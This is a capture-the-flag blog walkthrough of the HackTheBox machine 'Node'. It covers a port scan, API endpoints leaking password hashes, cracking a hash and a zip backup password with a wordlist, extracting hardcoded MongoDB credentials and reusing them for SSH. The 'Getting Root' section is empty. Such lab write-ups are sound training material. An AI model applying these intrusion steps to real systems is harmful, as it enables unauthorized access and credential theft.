---
layout: post
title: Hackthebox None Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-06/node-badge.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Node".<br>

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.58 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 21:28 EEST
Nmap scan report for 10.10.10.58
Host is up (0.040s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info:
|_  Logs: /login
| hadoop-tasktracker-info:
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.96 seconds
{% endhighlight %}


## 2. Getting User

Using Burp Suite, we can find an interesting HTTP request to "/api/users/latest" on port 3000.
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-06/node-badge.png)

Then, access to the API.<br>
We can see some passwords for user "tom", "mark" and "rastating".
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.58:3000/api/users/latest | jq
[
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
{% endhighlight %}

Next, try "/api/users".<br>
We can find an admin user "myP14ceAdm1nAcc0uNT".
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.58:3000/api/users/ | jq
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
{% endhighlight %}

We can crack the password using <a href="https://crackstation.net/">Crackstation.net</a>.<br>
The cracked password is "manchester".
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-06/node-badge.png)

We can download a file "myplace.backup" base64 encoded.<br>
Try to decode with base64 command.
{% highlight shell %}
root@kali:~# cat myplace.backup | base64 --decode > myplace
root@kali:~# file myplace
myplace: Zip archive data, at least v1.0 to extract
{% endhighlight %}

Since the zip file is password protected, try to brute-force using "fcrackzip".<br>
The password is "magicword".
{% highlight shell %}
root@kali:~# unzip myplace
Archive:  myplace
[myplace] var/www/myplace/package-lock.json password:

root@kali:~# fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace
possible pw found: magicword ()
{% endhighlight %}

Then, unzip the archive.
It looks like a source code of a NodeJS web application.
{% highlight shell %}
root@kali:~# unzip myplace
Archive:  myplace
[myplace] var/www/myplace/package-lock.json password:
  inflating: var/www/myplace/package-lock.json
  inflating: var/www/myplace/node_modules/serve-static/README.md
  inflating: var/www/myplace/node_modules/serve-static/index.js

---
{% endhighlight %}

Take a look at the source code.<br>
In "/var/www/myplace/app.js", we can find a mongodb credential for user "mark".
{% highlight shell %}
root@kali:~/var/www/myplace# cat app.js | grep mongo
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
    console.log('[!] Failed to connect to mongodb');
{% endhighlight %}

We can use the credential for SSH connection.
{% highlight shell %}
root@kali:~# ssh mark@10.10.10.58
mark@10.10.10.58's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.




              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
{% endhighlight %}

However, we are still not capable of getting user.txt.<br>
We have other 2 users.
{% highlight shell %}
mark@node:/home$ ls -l
total 12
drwxr-xr-x 2 root root 4096 Aug 31  2017 frank
drwxr-xr-x 3 root root 4096 Sep  3  2017 mark
drwxr-xr-x 6 root root 4096 Sep  3  2017 tom
{% endhighlight %}

## 3. Getting Root


